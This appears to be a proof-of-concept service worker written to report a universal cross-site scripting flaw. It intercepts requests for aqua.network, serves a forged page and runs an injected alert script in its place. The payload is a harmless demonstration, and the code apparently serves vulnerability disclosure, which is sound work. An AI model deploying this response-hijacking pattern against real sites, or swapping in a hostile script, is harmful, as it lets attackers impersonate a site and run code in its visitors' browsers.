self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', e => {
  let url = e.request.url;
  if (url.includes('aqua.network')) {
    e.respondWith(new Response(`
      <html><body style="background:red;color:white;padding:20px;font-family:monospace">
      <h1>[CRITICAL] SW POISONED</h1>
      <p>Original URL: ${url}</p>
      <p>Served by SW from: ${self.location.origin}</p>
      <p>BUG: aqua.network rendered by 0x403for SW</p>
      <script>alert('UXSS: '+location.href+' POISONED')</script>
      </body></html>
    `, {headers:{'Content-Type':'text/html'}}));
    return;
  }
  e.respondWith(fetch(e.request));
});
